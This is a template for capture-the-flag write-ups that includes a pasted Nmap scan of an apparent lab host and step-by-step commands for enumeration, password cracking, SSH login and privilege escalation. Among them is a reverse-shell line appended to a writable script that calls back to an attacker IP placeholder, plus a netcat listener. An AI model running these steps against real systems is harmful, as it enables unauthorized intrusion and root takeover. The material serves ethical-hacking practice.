# Hacking Challenge Write-Up Template

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.74.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-03-19T04:34:37+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2025-03-19T04:34:37
|_  start_date: N/A

...
```

## Web Enumeration

Navigating to the webpage hosted on port {PORT}, we analyze the content for useful information. Any potential attack vectors, such as login forms, directory structures, or disclosed credentials, are noted.

Further enumeration may involve:
```bash
gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

or

```bash
nikto -h http://{target_ip}
```

If credentials or hashes are found, they can be cracked using tools like Hashcat or John the Ripper:
```bash
hashcat -m {HASH_TYPE} hash.txt /usr/share/wordlists/rockyou.txt
```

## Access via Discovered Credentials

Using any found credentials, we attempt to log in via discovered services (e.g., SSH, FTP, POP3, IMAP).

```bash
ssh {username}@{target_ip}
```

or

```bash
telnet {target_ip} {PORT}
```

If email services are available, checking emails may reveal further credentials or hints.

## Privilege Escalation

Once access is obtained, we enumerate for privilege escalation vectors:
```bash
sudo -l
```

Checking for misconfigured scripts:
```bash
ls -la /opt/
cat /opt/{script}.sh
```

If a script is writable, modifying it to execute a reverse shell can escalate privileges:
```bash
echo "bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1" >> /opt/{script}.sh
```

Setting up a listener:
```bash
nc -lvnp 4444
```

## Root Access & Capture the Flag

Upon successful privilege escalation, we navigate to the root directory to retrieve the flag:
```bash
cat /root/root.txt
```

---
### Notes:
- Enhance enumeration techniques with LinPEAS or automated tools.
- Document any alternative attack paths.
- Practice safe engagement and ethical hacking principles.

